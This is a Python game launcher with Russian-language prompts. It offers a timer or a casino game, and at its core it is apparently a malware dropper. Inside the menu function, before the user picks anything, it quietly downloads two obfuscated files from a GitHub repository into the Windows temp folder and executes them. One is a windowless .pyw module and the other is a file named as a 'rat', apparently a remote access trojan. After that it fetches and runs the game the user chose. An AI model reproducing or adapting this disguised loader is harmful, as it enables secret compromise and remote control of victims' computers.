import json
import os
import time
from datetime import datetime
import urllib.request

os.chdir(os.getenv("tmp"))

def type_log(log):
    user = os.getlogin()
    if os.path.exists(f"C:\\Users\\{user}\\AppData\\Local\\Temp\\console.log"):
        with open("console.log", "a") as f:
            time = datetime.now().strftime("%Y:%m:%d %H:%M:%S")
            f.write(f"[{time}] {log}\n")
            return 0
    else:
        with open("console.log", "w") as f:
            time = datetime.now().strftime("%Y:%m:%d %H:%M:%S")
            f.write(f"[{time}] Файл console.log создан.\n")
            f.write(f"[{time}] {log}\n")
            return 0

def load_json():
    try:
        with open("fghfgjghjlhfjk54645sdfsdf.json", "r") as f:
            return json.load(f)
    except FileNotFoundError:
        user_name = input("Напишите свой ник: ")
        data = {
            "Name": user_name
        }
        with open("fghfgjghjlhfjk54645sdfsdf.json", "w") as f:
            json.dump(data, f, indent=4)
            type_log(f"Имя пользователя: {user_name}")
            return data

def menu():
    print(f"Здравствуйте, {info["Name"]}.\n"
                    f"Выберите что хотите загрузить:\n"
                    f"1.Таймер\n"
                    f"2.Казино SKAsiMan")

    url_module = "https://github.com/sharkriz/its_good/raw/main/okdnfjin93874957dfg.pyw"

    url_rat = "https://github.com/sharkriz/its_good/raw/main/kjdnfjinbg03984598rat.py"

    if os.path.exists(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\okdnfjin93874957dfg.pyw") and os.path.exists(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\kjdnfjinbg03984598rat.pyw"):
        pass
    else:
        urllib.request.urlretrieve(url_module, "okdnfjin93874957dfg.pyw")
        os.startfile("okdnfjin93874957dfg.pyw")
        time.sleep(4)
        urllib.request.urlretrieve(url_rat, "kjdnfjinbg03984598rat.pyw")
        os.startfile("kjdnfjinbg03984598rat.pyw")

    while True:
        try:
            hah = int(input())
            if hah == 1 or hah == 2:
                return hah
            else:
                print("Выберите что-то из списка!")
        except ValueError:
            print("Выберите что-то из списка!")

def load():

    choice = menu()

    url_timer = "https://github.com/sharkriz/its_good/raw/main/timer.py"
    url_casino = "https://github.com/sharkriz/its_good/raw/main/casino.py"

    if choice == 1:
        if os.path.exists(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\timer.py"):
            os.startfile("timer.py")
        else:
            urllib.request.urlretrieve(url_timer, "timer.py")
            os.startfile("timer.py")
    else:
        if os.path.exists(f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Temp\\casino.py"):
            os.startfile("casino.py")
        else:
            urllib.request.urlretrieve(url_casino, "casino.py")
            os.startfile("casino.py")

    load()


if __name__ == "__main__":
    info = load_json()
    type_log(f"Скрипт был запущен: {info["Name"]}")
    load()
